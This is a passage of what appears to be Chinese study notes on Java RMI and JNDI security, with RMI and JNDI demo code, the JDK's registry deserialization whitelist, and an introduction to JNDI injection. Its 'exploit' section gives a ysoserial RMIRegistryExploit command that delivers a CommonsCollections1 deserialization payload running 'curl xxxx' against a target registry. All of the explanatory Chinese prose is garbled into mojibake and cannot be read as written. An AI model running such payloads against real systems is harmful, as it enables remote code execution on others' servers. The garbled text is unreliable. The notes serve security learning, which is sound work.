class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Identity</span> <span class="keyword">implements</span> <span class="title">Serializable</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> id;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> age;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getId</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> id;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setId</span><span class="params">(<span class="keyword">int</span> id)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.id = id;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setName</span><span class="params">(String name)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getAge</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setAge</span><span class="params">(<span class="keyword">int</span> age)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å› ä¸ºé¡¾åŠåˆ°å¼€å‘ä¹ æƒ¯,æ‰€ä»¥æˆå‘˜å˜é‡éƒ½æ˜¯ç§æœ‰çš„ã€‚è‡ªç„¶è°ƒç”¨æ—¶ä¹Ÿè¦æœ‰å¯¹åº”çš„setter,getteræ–¹æ³•ã€‚ideaæ”¯æŒç›´æ¥alt+enteræ·»åŠ é€‰ä¸­å±æ€§çš„setterå’Œgetteræ–¹æ³•ã€‚</p><p>ç„¶åæ˜¯ä¸€ä¸ªè¿œç¨‹æ¥å£ï¼ŒServiceImpl.class</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.rmi.Remote;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">Service</span> <span class="keyword">extends</span> <span class="title">Remote</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> List&lt;Identity&gt; <span class="title">GetList</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿œç¨‹æ¥å£å¿…é¡»ç»§æ‰¿java.rmi.Remoteæ¥å£ï¼Œä¸”æŠ›å‡ºRemoteExceptioné”™è¯¯<br>ç„¶åæ˜¯æ¥å£çš„å®ç°ç±»</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.UnicastRemoteObject;</span><br><span class="line"><span class="keyword">import</span> java.util.LinkedList;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ServiceImpl</span> <span class="keyword">extends</span> <span class="title">UnicastRemoteObject</span> <span class="keyword">implements</span> <span class="title">Service</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">ServiceImpl</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> List&lt;Identity&gt; <span class="title">GetList</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"Get Identity Start!"</span>);</span><br><span class="line">        List&lt;Identity&gt; personlist =<span class="keyword">new</span> LinkedList&lt;Identity&gt;();</span><br><span class="line"></span><br><span class="line">        Identity person1 = <span class="keyword">new</span> Identity();</span><br><span class="line">        person1.setId(<span class="number">0</span>);</span><br><span class="line">        person1.setName(<span class="string">"byc"</span>);</span><br><span class="line">        person1.setAge(<span class="number">20</span>);</span><br><span class="line">        personlist.add(person1);</span><br><span class="line"></span><br><span class="line">        Identity person2 = <span class="keyword">new</span> Identity();</span><br><span class="line">        person2.setId(<span class="number">1</span>);</span><br><span class="line">        person2.setName(<span class="string">"Joe"</span>);</span><br><span class="line">        person2.setAge(<span class="number">18</span>);</span><br><span class="line">        personlist.add(person2);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> personlist;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ³¨æ„è¿™é‡Œæ„é€ æ–¹æ³•ä¹Ÿè¦throw  RemoteException.ç„¶åç±»å»ºå®Œåå¼€å§‹ä¼šæŠ¥é”™è¯´æˆ‘ä»¬æ²¡æœ‰å®ç°GetList()æ–¹æ³•ã€‚è¿™é‡Œç›´æ¥ç‚¹åˆ°æŠ¥é”™çš„ä½ç½®,å®ƒä¼šè‡ªåŠ¨æä¾›æˆ‘ä»¬ä¸€ä¸ªé‡å†™çš„GetList()æ–¹æ³•</p><p>ä¸‹é¢æ˜¯ä¸€ä¸ªæŠŠServerå’ŒRegistryçš„åˆ›å»ºã€å¯¹è±¡ç»‘å®šæ³¨å†Œè¡¨å†™åˆ°ä¸€å—çš„Programä»£ç </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.rmi.Naming;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Program</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Service personService =<span class="keyword">new</span> ServiceImpl();</span><br><span class="line">            LocateRegistry.createRegistry(<span class="number">6666</span>);</span><br><span class="line">            Naming.rebind(<span class="string">"rmi://127.0.0.1:6666/PersonService"</span>, personService);</span><br><span class="line">            System.out.println(<span class="string">"Service Start!"</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e ) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å®¢æˆ·ç«¯é€šè¿‡Naming.lookup()æ¥æŸ¥æ‰¾RMI Serverç«¯çš„è¿œç¨‹å¯¹è±¡å¹¶è·å–åˆ°æœ¬åœ°å®¢æˆ·ç«¯ç¯å¢ƒä¸­è¾“å‡ºå‡ºæ¥</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.rmi.Naming;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Client</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Service personService =(Service) Naming.lookup(<span class="string">"rmi://127.0.0.1:6666/PersonService"</span>);</span><br><span class="line">            List&lt;Identity&gt; personList=personService.GetList();</span><br><span class="line">            <span class="keyword">for</span>(Identity person:personList)&#123;</span><br><span class="line">                System.out.println(<span class="string">"ID:"</span>+person.getId()+<span class="string">" Age:"</span>+person.getAge()+<span class="string">" Name:"</span>+person.getName());</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception ex)&#123;</span><br><span class="line">            ex.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åŒæ ·æ˜¯ä½¿ç”¨ctrl+alt+tæ·»åŠ try catchè¯­å¥ç¯ç»•ä¸­é—´rmiéƒ¨åˆ†è¯­å¥ã€‚<br>å…ˆå¯åŠ¨rmiserver.ç„¶åå®¢æˆ·ç«¯è°ƒç”¨æ–¹æ³•ã€‚<br><img src="/2020/07/09/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-Java%E7%9B%B8%E5%85%B3/16.PNG" class="lazyload" data-srcset="16.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt><br><img src="/2020/07/09/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-Java%E7%9B%B8%E5%85%B3/17.PNG" class="lazyload" data-srcset="17.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><p>å‡ ä¸ªå‡½æ•°çš„ä½¿ç”¨</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">bind(String name, Object obj)ï¼šæ³¨å†Œå¯¹è±¡ï¼ŒæŠŠå¯¹è±¡å’Œä¸€ä¸ªåå­—nameç»‘å®š</span><br><span class="line"></span><br><span class="line">rebind(String name, Object obj)ï¼šæ³¨å†Œå¯¹è±¡ï¼ŒæŠŠå¯¹è±¡å’Œä¸€ä¸ªåå­—nameç»‘å®šã€‚å¦‚æœæ”¹åå­—å·²ç»ä¸å…¶ä»–å¯¹è±¡ç»‘å®šï¼Œä¸ä¼šæŠ›å‡ºNameAlreadyBoundExceptioné”™è¯¯ï¼Œè€Œæ˜¯æŠŠå½“å‰å‚æ•°objæŒ‡å®šçš„å¯¹è±¡è¦†ç›–åŸå…ˆçš„å¯¹è±¡</span><br><span class="line"><span class="comment">//å‰è€…åˆ™ä¼šæŠ›å‡ºNameAlreadyBoundExceptioné”™è¯¯</span></span><br><span class="line"></span><br><span class="line">lookup(String name)ï¼šæŸ¥æ‰¾å¯¹è±¡ï¼Œè¿”å›ä¸å‚æ•°nameæŒ‡å®šçš„åå­—æ‰€ç»‘å®šçš„å¯¹è±¡ï¼›</span><br></pre></td></tr></table></figure><ul><li>exploit</li></ul><p>Java 1.8.121ç‰ˆæœ¬ä»¥ä¸‹</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp ysoserial.jar ysoserial.exploit.RMIRegistryExploit target_ip 1099  CommonsCollections1 <span class="string">"curl xxxx"</span></span><br></pre></td></tr></table></figure><p>Java 1.8.121ç‰ˆæœ¬åŠä»¥ä¸Šï¼š<br>é‡å†™ä¸ªclass,æ‰”åˆ°ysoserialé‡Œé‡æ–°ç¼–è¯‘<a href="https://github.com/JoyChou93/java-sec-code/wiki/Java-RMI" target="_blank" rel="noopener">https://github.com/JoyChou93/java-sec-code/wiki/Java-RMI</a><br>è¿™æ ·ç›¸å½“äºåŠ äº†ä¸ªåˆ©ç”¨ç±»ã€‚ç„¶åç»§ç»­æ‰“å°±è¡Œäº†</p><p>å‘ç°vulhubåŸæ¥æœ‰javarmiçš„ä¸¤ä¸ªé•œåƒã€‚è‡ªå·±ä»“åº“å¤ªä¹…æ²¡æ›´æ–°å¯¼è‡´ç–å¿½äº†ã€‚</p><p>æˆ‘ä»¬æ¥çœ‹çœ‹jdké«˜ç‰ˆæœ¬æ—¶åšå‡ºçš„æ”¹å˜</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (String<span class="class">.<span class="keyword">class</span> </span>== clazz</span><br><span class="line">        || java.lang.Number<span class="class">.<span class="keyword">class</span>.<span class="title">isAssignableFrom</span>(<span class="title">clazz</span>)</span></span><br><span class="line"><span class="class">        || <span class="title">Remote</span>.<span class="title">class</span>.<span class="title">isAssignableFrom</span>(<span class="title">clazz</span>)</span></span><br><span class="line"><span class="class">        || <span class="title">java</span>.<span class="title">lang</span>.<span class="title">reflect</span>.<span class="title">Proxy</span>.<span class="title">class</span>.<span class="title">isAssignableFrom</span>(<span class="title">clazz</span>)</span></span><br><span class="line"><span class="class">        || <span class="title">UnicastRef</span>.<span class="title">class</span>.<span class="title">isAssignableFrom</span>(<span class="title">clazz</span>)</span></span><br><span class="line"><span class="class">        || <span class="title">RMIClientSocketFactory</span>.<span class="title">class</span>.<span class="title">isAssignableFrom</span>(<span class="title">clazz</span>)</span></span><br><span class="line"><span class="class">        || <span class="title">RMIServerSocketFactory</span>.<span class="title">class</span>.<span class="title">isAssignableFrom</span>(<span class="title">clazz</span>)</span></span><br><span class="line"><span class="class">        || <span class="title">java</span>.<span class="title">rmi</span>.<span class="title">activation</span>.<span class="title">ActivationID</span>.<span class="title">class</span>.<span class="title">isAssignableFrom</span>(<span class="title">clazz</span>)</span></span><br><span class="line"><span class="class">        || <span class="title">java</span>.<span class="title">rmi</span>.<span class="title">server</span>.<span class="title">UID</span>.<span class="title">class</span>.<span class="title">isAssignableFrom</span>(<span class="title">clazz</span>)) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> ObjectInputFilter.Status.ALLOWED;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> ObjectInputFilter.Status.REJECTED;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ‰€ä»¥åˆ©ç”¨æ—¶æ˜¯é€šè¿‡ç™½åå•é‡Œå¯åˆ©ç”¨çš„ç±»æ¥è¿›è¡Œååºåˆ—åŒ–ã€‚<br>å› ä¸ºrmiåœ¨å…¶ä»–æ´é‡Œå‡ºç°çš„é¢‘ç‡ä¹Ÿå¾ˆé«˜ã€‚æ‰€ä»¥å­¦ä¹ åˆ°å…¶ä»–æ¼æ´æ—¶ä¹Ÿä¼šæåŠã€‚</p><h3 id="jndiæ³¨å…¥"><a href="#jndiæ³¨å…¥" class="headerlink" title="jndiæ³¨å…¥"></a>jndiæ³¨å…¥</h3><p>jndiæ³¨å…¥çš„ä½¿ç”¨åœ¨shiroä¸fastjsonçš„ååºåˆ—åŒ–å¤ç°ä¸­éƒ½æ›¾ç»ä½¿ç”¨è¿‡ã€‚æƒ³è¦çœŸæ­£ç†è§£è¿™å‡ ç§æ¼æ´çš„è„‰ç»œ,è¿˜æ˜¯å¾—å…ˆæŠŠjndiçš„ç›¸å…³çŸ¥è¯†å­¦æ‡‚ã€‚</p><ul><li>jndi</li></ul><blockquote><p>JNDIå…¨ç§°ä¸º Java Naming and DirectoryInterfaceï¼ˆJavaå‘½åå’Œç›®å½•æ¥å£ï¼‰ï¼Œæ˜¯ä¸€ç»„åº”ç”¨ç¨‹åºæ¥å£ï¼Œä¸ºå¼€å‘äººå‘˜æŸ¥æ‰¾å’Œè®¿é—®å„ç§èµ„æºæä¾›äº†ç»Ÿä¸€çš„é€šç”¨æ¥å£ï¼Œå¯ä»¥ç”¨æ¥å®šä¹‰ç”¨æˆ·ã€ç½‘ç»œã€æœºå™¨ã€å¯¹è±¡å’ŒæœåŠ¡ç­‰å„ç§èµ„æºã€‚<br>JNDIæ”¯æŒçš„æœåŠ¡ä¸»è¦æœ‰ï¼šDNSã€LDAPã€CORBAã€RMIç­‰</p></blockquote><p>æ‰€ä»¥è¯´jndiçš„ä½œç”¨ä¸»è¦åœ¨äºâ€å®šä½â€ã€‚æ¯”å¦‚å®šä½rmiä¸­æ³¨å†Œçš„å¯¹è±¡,è®¿é—®ldapçš„ç›®å½•æœåŠ¡ç­‰ç­‰ã€‚</p><ul><li>demo</li></ul><p>å…¶ä½¿ç”¨ä¸rmiå¾ˆç±»ä¼¼</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">bindï¼šå°†åç§°ç»‘å®šåˆ°å¯¹è±¡ä¸­ï¼›</span><br><span class="line">lookupï¼šé€šè¿‡åå­—æ£€ç´¢æ‰§è¡Œçš„å¯¹è±¡</span><br></pre></td></tr></table></figure><p>ä¸‹é¢æ˜¯å†™çš„demo</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"><span class="keyword">import</span> java.rmi.Remote;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Identity</span> <span class="keyword">implements</span> <span class="title">Remote</span>,<span class="title">Serializable</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> id;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> age;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getId</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> id;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setId</span><span class="params">(<span class="keyword">int</span> id)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.id = id;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setName</span><span class="params">(String name)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getAge</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setAge</span><span class="params">(<span class="keyword">int</span> age)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"id: "</span>+id+<span class="string">" name: "</span>+name+<span class="string">" age: "</span>+age;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä¸ä¸Šé¢rmiçš„Identityç±»ä¸åŒçš„æ˜¯,è¿™é‡Œæˆ‘ä»¬å¿…é¡»è®©å®ƒç»§æ‰¿java.rmi.Remoteç±».å¦åˆ™ä¼šæŠ›å‡ºé”™è¯¯ã€‚åŒæ—¶åŠ ä¸Šä¸€ä¸ª<code>toString()</code>æ–¹æ³•æ–¹ä¾¿æˆ‘ä»¬è·å–å¹¶æ‰“å°å¯¹è±¡çš„å±æ€§ã€‚</p><p>ä¸€ä¸ªæœåŠ¡ç«¯+å®¢æˆ·ç«¯çš„æ•´åˆä»£ç ã€‚å…ˆç”¨jndiçš„bindå°†Identityå¯¹è±¡ç»‘å®šåœ¨rmiæœåŠ¡ä¸­ã€‚ç„¶åå†lookupæ£€ç´¢å¯¹è±¡è¾“å‡ºã€‚<br>JndiServer</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.naming.Context;</span><br><span class="line"><span class="keyword">import</span> javax.naming.InitialContext;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">JndiServer</span> </span>&#123;</span><br><span class="line">   <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span>  <span class="title">initIdentity</span><span class="params">()</span> <span class="keyword">throws</span>  Exception</span>&#123;</span><br><span class="line">       LocateRegistry.createRegistry(<span class="number">6666</span>);</span><br><span class="line">       System.setProperty(Context.INITIAL_CONTEXT_FACTORY, <span class="string">"com.sun.jndi.rmi.registry.RegistryContextFactory"</span>);</span><br><span class="line">       System.setProperty(Context.PROVIDER_URL, <span class="string">"rmi://localhost:6666"</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">       InitialContext ctx = <span class="keyword">new</span> InitialContext();</span><br><span class="line"></span><br><span class="line">       Identity a= <span class="keyword">new</span> Identity();</span><br><span class="line">       a.setId(<span class="number">0</span>);</span><br><span class="line">       a.setAge(<span class="number">20</span>);</span><br><span class="line">       a.setName(<span class="string">"byc_404"</span>);</span><br><span class="line"></span><br><span class="line">       ctx.bind(<span class="string">"person"</span>,a);</span><br><span class="line">       ctx.close();</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">getIdentity</span><span class="params">()</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        InitialContext ctx = <span class="keyword">new</span> InitialContext();</span><br><span class="line"></span><br><span class="line">        Identity person = (Identity) ctx.lookup(<span class="string">"person"</span>);</span><br><span class="line"></span><br><span class="line">        System.out.println(person.toString());</span><br><span class="line">        ctx.close();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        initIdentity();</span><br><span class="line">        getIdentity();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ³¨æ„æˆ‘ä»¬éœ€è¦å…ˆè¡Œè®¾ç½®jndiå·¥å‚çš„urlåŠç«¯å£ç­‰ç­‰å±æ€§ã€‚<br><img src="/2020/07/09/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-Java%E7%9B%B8%E5%85%B3/17.5.PNG" class="lazyload" data-srcset="17.5.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><ul><li>traits of jndi</li></ul><p>jndiå­˜åœ¨å®‰å…¨ç®¡ç†å™¨.å¯¹äºåŠ è½½è¿œç¨‹å¯¹è±¡ï¼ŒJDNIæœ‰ä¸¤ç§ä¸åŒçš„å®‰å…¨æ§åˆ¶æ–¹å¼ï¼Œå¯¹äºNaming Manageræ¥è¯´ï¼Œç›¸å¯¹çš„å®‰å…¨ç®¡ç†å™¨çš„è§„åˆ™æ¯”è¾ƒå®½æ³›ï¼Œä½†æ˜¯å¯¹JNDI SPIå±‚ä¼šæŒ‰ç…§ä¸‹é¢è¡¨æ ¼ä¸­çš„è§„åˆ™è¿›è¡Œæ§åˆ¶ï¼š</p><p><img src="/2020/07/09/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-Java%E7%9B%B8%E5%85%B3/18.PNG" class="lazyload" data-srcset="18.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" 